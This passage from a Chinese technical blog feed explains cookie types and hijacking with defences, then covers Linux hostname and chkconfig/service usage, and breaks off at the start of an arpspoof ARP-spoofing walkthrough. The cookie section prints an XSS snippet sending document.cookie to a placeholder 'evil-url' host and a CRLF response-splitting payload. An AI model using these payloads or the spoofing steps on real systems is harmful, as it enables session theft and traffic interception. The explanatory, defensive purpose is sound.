Cookie</p><p>设置了超时时间的Cookie，会在指定时间销毁，Cookie的维持时间可以持续到浏览器退出之后，这种Cookie被持久化在浏览器中。</p><p>很多站点用Cookie跟踪用户的历史记录，例如广告类站点会使用Cookie记录浏览过哪些内容，搜索引擎会使用Cookie记录历史搜索记录，这时也可以称作Tracking Cookie，因为它被用于追踪用户行为。</p><h4 id="Secure-Cookie"><a href="#Secure-Cookie" class="headerlink" title="Secure Cookie"></a>Secure Cookie</h4><p>服务器端设置Cookie的时候，可以指定Secure属性，这时Cookie只有通过https协议传输的时候才会带到网络请求中，不加密的http请求不会带有Secure Cookie。</p><p>设置secure cookie的方式举例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: foo=bar; Path=/; Secure</span><br></pre></td></tr></table></figure><h4 id="HttpOnly-Cookie"><a href="#HttpOnly-Cookie" class="headerlink" title="HttpOnly Cookie"></a>HttpOnly Cookie</h4><p>服务器端设置Cookie的时候，也可以指定一个HttpOnly属性。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: foo=bar; Path=/; HttpOnly</span><br></pre></td></tr></table></figure><p>设置了这个属性的Cookie在javascript中无法获取到，只会在网络传输过程中带到服务器。</p><h4 id="Third-Party-Cookie"><a href="#Third-Party-Cookie" class="headerlink" title="Third-Party Cookie"></a>Third-Party Cookie</h4><p>第三方Cookie的使用场景通常是iframe，例如<code>www.a.com</code>嵌入了一个<code>www.ad.com</code>的广告iframe，那么<code>www.ad.com</code>设置的cookie属于不属于<code>www.a.com</code>，被称作<code>第三方Cookie</code>。</p><h4 id="Supercookie"><a href="#Supercookie" class="headerlink" title="Supercookie"></a>Supercookie</h4><p>Cookie会从属于一个域名，例如<code>www.a.com</code>，或者属于一个子域，例如<code>b.a.com</code>。但是如果Cookie被声明为属于<code>.com</code>会发生什么？这个Cookie会在任何<code>.com</code>域名生效。这有很大的安全性问题。这种Cookie被称作<code>Supercookie</code>。</p><p>浏览器做出了限制，不允许设置顶级域名Cookie(例如.com，.net)和pubic suffix cookie(例如.co.uk，.com.cn)。</p><p>现代主流浏览器都很好的处理了Supercookie问题，但是如果有些第三方浏览器使用的顶级域名和public suffix列表有问题，那么就可以针对Supercookie进行攻击。</p><h4 id="Zombie-Cookie-Evercookie"><a href="#Zombie-Cookie-Evercookie" class="headerlink" title="Zombie Cookie/Evercookie"></a>Zombie Cookie/Evercookie</h4><p>僵尸Cookie是指当用户通过浏览器的设置清除Cookie后可以自动重新创建的Cookie。原理是通过使用多重技术记录同样的内容(例如flash，silverlight)，当Cookie被删除时，从其他存储中恢复。</p><p>Evercookie是实现僵尸Cookie的主要技术手段。</p><h3 id="Cookie劫持"><a href="#Cookie劫持" class="headerlink" title="Cookie劫持"></a>Cookie劫持</h3><p>包含了一些敏感消息：用户名，电脑名，使用的浏览器和曾经访问的网站。用户不希望这些内容泄漏出去，尤其是当其中还包含有私人信息的时候。</p><p>XSS（Cross site scripting，跨站脚本）是最基本的Cookie窃取方式。当攻击者通过XSS获取到用户Cookie后，攻击者将利用Cookie通过合法手段进入用户账号，浏览大部分用户资源。下图是Cookie劫持的示意图：</p><p><img src="/img/network/http/cookie_xss.jpg" alt=""></p><p>​    另外，攻击者也能制造Cookie投毒。一般认为，Cookie在储存和传回服务器期间没有被修改过，而攻击者会在Cookie送回服务器之前对其进行修改，达到自己的目的。例如，在一个购物网站的Cookie中包含了顾客应付的款项，攻击者将该值改小，达到少付款的目的。这就是Cookie投毒。</p><h4 id="利用XSS漏洞获取Cookie"><a href="#利用XSS漏洞获取Cookie" class="headerlink" title="利用XSS漏洞获取Cookie"></a>利用XSS漏洞获取Cookie</h4><p><strong>攻击方法</strong></p><p>一旦站点中存在可利用的XSS漏洞，攻击者可直接利用注入的js脚本获取Cookie，进而通过异步请求把标识Session id的Cookie上报给攻击者。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var img = document.createElement(&apos;img&apos;);</span><br><span class="line">img.src = &apos;http://evil-url?c=&apos; + encodeURIComponent(document.cookie);</span><br><span class="line">document.getElementsByTagName(&apos;body&apos;)[0].appendChild(img);</span><br></pre></td></tr></table></figure><p><strong>防御方法</strong></p><p>根据上面HttpOnly Cookie的介绍，一旦一个Cookie被设置为HttpOnly，js脚本就无法再获取到，而网络传输时依然会带上。也就是说依然可以依靠这个Cookie进行Session维持，但客户端js对其不可见。那么即使存在XSS漏洞也无法简单的利用其进行Session劫持攻击了。</p><p>上面说的防御方法无法利用XSS进行简单的攻击，但可以通过XSS结合其他漏洞获取Cookie。比如XSS结合phpinfo页面、HTTP Response Splitting。</p><h4 id="XSS结合phpinfo页面"><a href="#XSS结合phpinfo页面" class="headerlink" title="XSS结合phpinfo页面"></a>XSS结合phpinfo页面</h4><p><strong>攻击方法</strong></p><p>利用php开发应用会有一个phpinfo页面，这个页面会dump出请求信息，其中就包括Cookie信息。如下图所示的<code>_SERVER[&quot;HTTP_COOKIE&quot;]</code>变量。</p><p><img src="/img/network/http/php_var.png" alt=""></p><p>​    如果开发者没有关闭这个页面，就可以利用XSS漏洞向这个页面发起异步请求，获取到页面内容后parse出Cookie信息，然后上传给攻击者。</p><p>​    phpinfo是比较常见的一种dump请求的页面，但不限于此，为了调试方便，任何dump请求的页面都是可以被利用的漏洞。</p><p><strong>防御方法</strong></p><p>关闭所有phpinfo类dump request信息的页面。</p><h4 id="HTTP-Response-Splitting"><a href="#HTTP-Response-Splitting" class="headerlink" title="HTTP Response Splitting"></a>HTTP Response Splitting</h4><p><strong>攻击方法</strong></p><p>通常的XSS攻击都是把输入内容注入到response的content中，HTTP Response Splitting是一种针对header的注入。</p><p>例如，一个站点接受参数做302跳转：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.example.com/?r=http://baidu.com</span><br></pre></td></tr></table></figure><p>request信息为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /example.com?r=http://baidu.com\r\n</span><br><span class="line">HTTP/1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>response为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 302 Found\r\n</span><br><span class="line">Location: http://baidu.com\r\n</span><br><span class="line">Content-Type: text/html\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>这样页面就302跳转到了百度了。攻击者利用r参数可以注入header，r参数不是简单的url，而是包含\r\n的header信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/?r=%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aX-XSS-Protection:%200%0d%0a%0d%0a%3Chtml%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Ch1%3EDefaced!%3C/h1%3E%3C/html%3E</span><br></pre></td></tr></table></figure><p>这样，response就变成了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 302 Found\r\n</span><br><span class="line">Location: \r\n</span><br><span class="line">HTTP/1.1 200 OK\r\n</span><br><span class="line">Content-Type: text/html\r\n</span><br><span class="line">X-XSS-Protection: 0\r\n</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;h1&gt;Defaced!&lt;/h1&gt;&lt;/html&gt;</span><br><span class="line">Content-Type: text/html\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>其中，X-XSS-Protection: 0 是关闭浏览器的XSS保护机制。</p><p><strong>防御方法</strong></p><p>针对header的内容做过滤，不能漏掉\r\n，特别是Location，host，referrer等。</p><h4 id="网络监听"><a href="#网络监听" class="headerlink" title="网络监听"></a>网络监听</h4><p><strong>防御方法</strong></p><p>网站使用Https协议。</p><p>防御网络监听通常有两种方式：信道加密和内容加密。网站开启Https连接属于信道加密，使用https协议的请求都被SSL加密，理论上不可破解，即便被网络监听也无法通过解密看到实际的内容。</p><p>但是，如果网站同时支持http和https，那么还是可以使用网络监听http请求获取Cookie。如果网站只支持Https，当用户直接输入example.com（大部分用户不会手动输入协议前缀），Web服务器通常的处理是返回301要求浏览器重定向到<a href="https://www.example.com%E3%80%82**%E5%9B%A0%E4%B8%BA%E8%BF%99%E6%AC%A1301%E8%AF%B7%E6%B1%82%E6%98%AFhttp%E7%9A%84%EF%BC%8C%E8%80%8C%E4%B8%94%E5%B8%A6%E4%BA%86Cookie%EF%BC%8C%E5%9B%A0%E6%AD%A4%E5%8F%88%E5%B0%86Cookie%E6%98%8E%E6%96%87%E6%9A%B4%E9%9C%B2%E5%9C%A8%E4%BA%86%E7%BD%91%E7%BB%9C%E4%B8%8A%E3%80%82**/" target="_blank" rel="noopener">https://www.example.com。<strong>因为这次301请求是http的，而且带了Cookie，因此又将Cookie明文暴露在了网络上。</strong></a></p><p>针对这个问题，有两个防御思路：</p><ol><li>把标识Session的Cookie设置成<code>Secure</code>。上面提到的Secure Cookie，只允许在https上加密传输，在http请求中不会存在，这样就不会暴露在未加密的网络上了。</li><li>设置<code>Strict-Transport-Security header</code>，直接省略这个http请求！用户首次访问后，服务器设置了这个header以后，后面就会省略掉这次http 301请求。</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Network </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux 修改主机名</title>
      <link href="/2018/04/13/yunwei/Linux-%E4%BF%AE%E6%94%B9%E4%B8%BB%E6%9C%BA%E5%90%8D/"/>
      <url>/2018/04/13/yunwei/Linux-%E4%BF%AE%E6%94%B9%E4%B8%BB%E6%9C%BA%E5%90%8D/</url>
      
        <content type="html"><![CDATA[<h4 id="临时修改主机名-hostname"><a href="#临时修改主机名-hostname" class="headerlink" title="临时修改主机名 hostname"></a>临时修改主机名 hostname</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost sysconfig]# hostname</span><br><span class="line">localhost.localdomain</span><br><span class="line">[root@localhost sysconfig]# </span><br><span class="line">[root@localhost sysconfig]# </span><br><span class="line">[root@localhost sysconfig]# hostname svn.domain</span><br><span class="line">[root@localhost sysconfig]# </span><br><span class="line">[root@localhost sysconfig]# hostname </span><br><span class="line">svn.domain</span><br><span class="line">[root@localhost sysconfig]#</span><br></pre></td></tr></table></figure><a id="more"></a><p><br></p><h4 id="永久修改主机名"><a href="#永久修改主机名" class="headerlink" title="永久修改主机名"></a>永久修改主机名</h4><h5 id="redhat-cetnos-修改："><a href="#redhat-cetnos-修改：" class="headerlink" title="redhat/cetnos 修改："></a>redhat/cetnos 修改：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost etc]# cat /etc/sysconfig/network</span><br><span class="line">NETWORKING=yes</span><br><span class="line">NETWORKING_IPV6=no</span><br><span class="line">HOSTNAME=svn.domain</span><br><span class="line"></span><br><span class="line">[root@localhost etc]# cat /etc/hosts</span><br><span class="line">127.0.0.1svn.domain localhost</span><br></pre></td></tr></table></figure><h5 id="deb-ubuntu修改"><a href="#deb-ubuntu修改" class="headerlink" title="deb/ubuntu修改"></a>deb/ubuntu修改</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Kali:/etc# cat /etc/hostname </span><br><span class="line">Kali</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>chkconfig&amp;service</title>
      <link href="/2018/04/10/commands/chkconfig-service/"/>
      <url>/2018/04/10/commands/chkconfig-service/</url>
      
        <content type="html"><![CDATA[<h3 id="chkconfig简介"><a href="#chkconfig简介" class="headerlink" title="chkconfig简介"></a>chkconfig简介</h3><p><code>chkconfig</code>命令主要用来更新(启动或停止或修改)和查询系统服务的运行级信息。 <code>chkconfig</code>不是立即自动禁用或激活一个服务，而是改变符号链接，从而影响开机自启动运行。</p><p><code>chkconfig</code> 依赖<code>/etc/init.d</code>目录中的进程管理脚本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@gitserver ~]# chkconfig --help</span><br><span class="line">chkconfig 版本 1.7.4 - 版权 (C) 1997-2000 Red Hat, Inc.</span><br><span class="line">在 GNU 公共许可条款下，本软件可以免费重新发布。</span><br><span class="line"></span><br><span class="line">用法：chkconfig [--list] [--type &lt;type&gt;] [name]</span><br><span class="line">         chkconfig --add &lt;name&gt;</span><br><span class="line">         chkconfig --del &lt;name&gt;</span><br><span class="line">         chkconfig --override &lt;name&gt;</span><br><span class="line">         chkconfig [--level &lt;levels&gt;] [--type &lt;type&gt;] &lt;name&gt; &lt;on|off|reset|resetpriorities&gt;</span><br></pre></td></tr></table></figure><a id="more"></a><p><br></p><h4 id="chkconfig原理"><a href="#chkconfig原理" class="headerlink" title="chkconfig原理"></a>chkconfig原理</h4><p><code>/etc/rcX.d</code> 目录存放各个运行级别下Linux自启动服务。 X指<a href="">运行级别</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[root@gitserver ~]# ls -ls /etc/rc* </span><br><span class="line">0 lrwxrwxrwx   1 root root  10 9月  15 2017 /etc/rc0.d -&gt; rc.d/rc0.d #运行模式0下需要启动的服务</span><br><span class="line">0 lrwxrwxrwx   1 root root  10 9月  15 2017 /etc/rc1.d -&gt; rc.d/rc1.d #运行模式1下需要启动的服务</span><br><span class="line">0 lrwxrwxrwx   1 root root  10 9月  15 2017 /etc/rc2.d -&gt; rc.d/rc2.d #运行模式2下需要启动的服务</span><br><span class="line">0 lrwxrwxrwx   1 root root  10 9月  15 2017 /etc/rc3.d -&gt; rc.d/rc3.d #运行模式3下需要启动的服务</span><br><span class="line">0 lrwxrwxrwx   1 root root  10 9月  15 2017 /etc/rc4.d -&gt; rc.d/rc4.d #运行模式4下需要启动的服务</span><br><span class="line">0 lrwxrwxrwx   1 root root  10 9月  15 2017 /etc/rc5.d -&gt; rc.d/rc5.d #运行模式5下需要启动的服务</span><br><span class="line">0 lrwxrwxrwx   1 root root  10 9月  15 2017 /etc/rc6.d -&gt; rc.d/rc6.d #运行模式6下需要启动的服务</span><br><span class="line">0 lrwxrwxrwx   1 root root  13 10月 25 09:02 /etc/rc.local -&gt; rc.d/rc.local</span><br><span class="line"></span><br><span class="line">/etc/rc.d:</span><br><span class="line">总用量 4</span><br><span class="line">0 drwxr-xr-x. 2 root root  97 1月   9 14:22 init.d</span><br><span class="line">0 drwxr-xr-x. 2 root root  45 8月   4 2017 rc0.d</span><br><span class="line">0 drwxr-xr-x. 2 root root  45 8月   4 2017 rc1.d</span><br><span class="line">0 drwxr-xr-x. 2 root root  45 8月   4 2017 rc2.d</span><br><span class="line">0 drwxr-xr-x. 2 root root  45 8月   4 2017 rc3.d</span><br><span class="line">0 drwxr-xr-x. 2 root root  45 8月   4 2017 rc4.d</span><br><span class="line">0 drwxr-xr-x. 2 root root  45 8月   4 2017 rc5.d</span><br><span class="line">0 drwxr-xr-x. 2 root root  45 8月   4 2017 rc6.d</span><br><span class="line">4 -rw-r--r--. 1 root root 596 3月   8 14:47 rc.local</span><br><span class="line"></span><br><span class="line">[root@gitserver rc3.d]# runlevel   ## 查看运行级别</span><br><span class="line">N 3</span><br><span class="line">[root@gitserver rc3.d]# </span><br><span class="line">[root@gitserver rc3.d]# ls -ls</span><br><span class="line">总用量 0</span><br><span class="line">0 lrwxrwxrwx. 1 root root 20 6月  21 2017 K50netconsole -&gt; ../init.d/netconsole</span><br><span class="line">0 lrwxrwxrwx. 1 root root 17 6月  21 2017 S10network -&gt; ../init.d/network</span><br></pre></td></tr></table></figure><p>进程管理脚本放置于<code>/etc/init.d</code>目录下， <code>rcX.d</code>自启动脚本链接到<code>/etc/init.d</code></p><h4 id="添加删除服务"><a href="#添加删除服务" class="headerlink" title="添加删除服务"></a>添加删除服务</h4><p><code>chkconfig</code>命令添加或删除操作其实就是创建或删除这个目录的软连接。</p><p><code>chkcofnig -add</code>添加服务时，服务脚本必须存放在<code>/etc/ini.d/</code>目录下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[root@pgunimation rc3.d]# ls -ls</span><br><span class="line">total 0</span><br><span class="line">0 lrwxrwxrwx  1 root root 20 Apr 22 21:23 K50netconsole -&gt; ../init.d/netconsole</span><br><span class="line">0 lrwxrwxrwx. 1 root root 21 Jun 25  2017 S05qemukvmga -&gt; /etc/init.d/qemukvmga</span><br><span class="line">0 lrwxrwxrwx. 1 root root 17 Mar 13  2017 S10network -&gt; ../init.d/network</span><br><span class="line">0 lrwxrwxrwx. 1 root root 17 Jan  4 23:29 S11gwarp -&gt; /etc/init.d/gwarp</span><br><span class="line">[root@pgunimation rc3.d]# </span><br><span class="line">[root@pgunimation rc3.d]# chkconfig --del netconsole</span><br><span class="line">[root@pgunimation rc3.d]# </span><br><span class="line">[root@pgunimation rc3.d]# ls -ls</span><br><span class="line">total 0</span><br><span class="line">0 lrwxrwxrwx. 1 root root 21 Jun 25  2017 S05qemukvmga -&gt; /etc/init.d/qemukvmga</span><br><span class="line">0 lrwxrwxrwx. 1 root root 17 Mar 13  2017 S10network -&gt; ../init.d/network</span><br><span class="line">0 lrwxrwxrwx. 1 root root 17 Jan  4 23:29 S11gwarp -&gt; /etc/init.d/gwarp</span><br><span class="line">[root@pgunimation rc3.d]# </span><br><span class="line">[root@pgunimation rc3.d]# chkconfig --add  netconsole</span><br><span class="line">[root@pgunimation rc3.d]# </span><br><span class="line">[root@pgunimation rc3.d]# ls -ls </span><br><span class="line">total 0</span><br><span class="line">0 lrwxrwxrwx  1 root root 20 Apr 22 21:23 K50netconsole -&gt; ../init.d/netconsole</span><br><span class="line">0 lrwxrwxrwx. 1 root root 21 Jun 25  2017 S05qemukvmga -&gt; /etc/init.d/qemukvmga</span><br><span class="line">0 lrwxrwxrwx. 1 root root 17 Mar 13  2017 S10network -&gt; ../init.d/network</span><br><span class="line">0 lrwxrwxrwx. 1 root root 17 Jan  4 23:29 S11gwarp -&gt; /etc/init.d/gwarp</span><br><span class="line">[root@pgunimation rc3.d]# </span><br><span class="line">[root@pgunimation rc3.d]# chkconfig --list </span><br><span class="line">gwarp          0:off1:off2:on3:on4:on5:on6:off</span><br><span class="line">netconsole     0:off1:off2:off3:off4:off5:off6:off</span><br><span class="line">network        0:off1:off2:on3:on4:on5:on6:off</span><br><span class="line">qemukvmga      0:off1:off2:on3:on4:on5:on6:off</span><br></pre></td></tr></table></figure><p>每个软链接的命名都是”大写S/K+运行顺序+脚本名称”, 其中开机自启动为<code>S</code>, 不随机自启动为<code>K</code></p><h5 id="管理脚本写法"><a href="#管理脚本写法" class="headerlink" title="管理脚本写法"></a>管理脚本写法</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">[root@pgunimation init.d]# cat gwarp </span><br><span class="line">#!/bin/sh -e  </span><br><span class="line">PATH=/bin  </span><br><span class="line"></span><br><span class="line">#*</span><br><span class="line">以下几行并不会被chkconfig作为注释，会被完整解析</span><br><span class="line">*#</span><br><span class="line"></span><br><span class="line"># chkconfig: 2345 05 96    ### 缺省运行级别   05/96 意思启动顺序S05 /停止顺序K96</span><br><span class="line"># description: Static ARP entry for Gateway  ### 服务描述</span><br><span class="line">### BEGIN INIT INFO</span><br><span class="line"># Provides:          gwarp</span><br><span class="line"># Required-Start:    $network</span><br><span class="line"># Required-Stop:     $network</span><br><span class="line"># Default-Start:     2 3 4 5</span><br><span class="line"># Default-Stop:      0 1 6</span><br><span class="line"># Short-Description: STATIC ARP GW</span><br><span class="line"># Description:       STATIC ARP GW</span><br><span class="line">### END INIT INFO</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">case &quot;$1&quot; in  </span><br><span class="line">start)  </span><br><span class="line">echo &quot;starting&quot;  </span><br><span class="line">cd /usr/bin  </span><br><span class="line">ls  </span><br><span class="line">;;  </span><br><span class="line">stop)  </span><br><span class="line">echo &quot;Stopping&quot;  </span><br><span class="line">kill -9  </span><br><span class="line">;;  </span><br><span class="line">restart)  </span><br><span class="line">$0 stop || true  </span><br><span class="line">$0 start  </span><br><span class="line">;;  </span><br><span class="line">*)  </span><br><span class="line">echo &quot;Usage: ls &#123;start|stop|restart&#125;&quot;  </span><br><span class="line">exit 1  </span><br><span class="line">;;  </span><br><span class="line">esac</span><br></pre></td></tr></table></figure><p>将脚本放置于<code>/etc/init.d</code> 目录下， 即可使用<code>chkconfig --add</code> 添加服务，进行缺省启动配置。</p><p><a href="https://pan.baidu.com/s/19IoMNGUnQksrfCPa4xhS_A" target="_blank" rel="noopener">httpd完整服务脚本</a></p><h4 id="修改服务自启动级别"><a href="#修改服务自启动级别" class="headerlink" title="修改服务自启动级别"></a>修改服务自启动级别</h4><p><code>chkcofig --level</code> 修改链接文件名规则，<code>S</code>/<code>K</code> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[root@pgunimation rc3.d]# chkconfig --level 3 netconsole on </span><br><span class="line">[root@pgunimation rc3.d]# chkconfig --list</span><br><span class="line">gwarp          0:off1:off2:on3:on4:on5:on6:off</span><br><span class="line">netconsole     0:off1:off2:off3:on4:off5:off6:off</span><br><span class="line">network        0:off1:off2:on3:on4:on5:on6:off</span><br><span class="line">qemukvmga      0:off1:off2:on3:on4:on5:on6:off</span><br><span class="line">[root@pgunimation rc3.d]# </span><br><span class="line">[root@pgunimation rc3.d]# ls -ls </span><br><span class="line">total 0</span><br><span class="line">0 lrwxrwxrwx. 1 root root 21 Jun 25  2017 S05qemukvmga -&gt; /etc/init.d/qemukvmga</span><br><span class="line">0 lrwxrwxrwx. 1 root root 17 Mar 13  2017 S10network -&gt; ../init.d/network</span><br><span class="line">0 lrwxrwxrwx. 1 root root 17 Jan  4 23:29 S11gwarp -&gt; /etc/init.d/gwarp</span><br><span class="line">0 lrwxrwxrwx  1 root root 20 Apr 22 21:19 S50netconsole -&gt; ../init.d/netconsole</span><br><span class="line">[root@pgunimation rc3.d]# chkconfig --level 3 netconsole off </span><br><span class="line">[root@pgunimation rc3.d]# </span><br><span class="line">[root@pgunimation rc3.d]# </span><br><span class="line">[root@pgunimation rc3.d]# ls -ls </span><br><span class="line">total 0</span><br><span class="line">0 lrwxrwxrwx  1 root root 20 Apr 22 21:19 K50netconsole -&gt; ../init.d/netconsole</span><br><span class="line">0 lrwxrwxrwx. 1 root root 21 Jun 25  2017 S05qemukvmga -&gt; /etc/init.d/qemukvmga</span><br><span class="line">0 lrwxrwxrwx. 1 root root 17 Mar 13  2017 S10network -&gt; ../init.d/network</span><br><span class="line">0 lrwxrwxrwx. 1 root root 17 Jan  4 23:29 S11gwarp -&gt; /etc/init.d/gwarp</span><br></pre></td></tr></table></figure><h3 id="service"><a href="#service" class="headerlink" title="service"></a>service</h3><p>service命令用来快速开启或者停止Linux服务程序。 yum/apt-get 安装新的服务程序后，都会自动在<code>/etc/init.d</code> 中添加一个管理本服务进程的shell脚本。 例如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/mysql</span><br><span class="line">/etc/init.d/nginx</span><br></pre></td></tr></table></figure><p>此时，我们想要启动服务即可使用 <code>/etc/init.d/xxx start  或者 service xxx start</code> 启动</p><p>如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/mysql start</span><br><span class="line">servicr mysql start</span><br></pre></td></tr></table></figure><p><code>service</code> 其实本质即加载<code>/etc/init.d/xxx start</code> 服务启动 。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@pgunimation init.d]# service --help</span><br><span class="line">Usage: service &lt; option &gt; | --status-all | [ service_name [ command | --full-restart ] ]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 命令 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Commands </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>arpspoof</title>
      <link href="/2018/04/03/kali/arpspoof/"/>
      <url>/2018/04/03/kali/arpspoof/</url>
      
        <content type="html"><![CDATA[<h4 id="Arpspoof"><a href="#Arpspoof" class="headerlink" title="Arpspoof"></a>Arpspoof</h4><p>​    Arpspoof是一个非常好的ARP欺骗的源代码程序。它的运行不会影响整个网络的通信，该工具通过替换传输中的数据从而达到对目标的欺骗。</p><a id="more"></a><p><br></p><h4 id="凡是使用Arpspoof工具必先开启-路由转发功能。"><a href="#凡是使用Arpspoof工具必先开启-路由转发功能。" class="headerlink" title="凡是使用Arpspoof工具必先开启 路由转发功能。"></a>凡是使用Arpspoof工具必先开启 路由转发功能。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure><h4 id="流量操纵攻击"><a href="#流量操纵攻击" class="headerlink" title="流量操纵攻击"></a>流量操纵攻击</h4><ol><li><p>启动Arpspoof注入攻击目标系统。攻击的方法是攻击者（192.168.2.51）发送ARP数据包，以欺骗网关（192.168.2.1）和目标系统（192.168.2.253）。下面首先欺骗目标系统，执行命令如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td 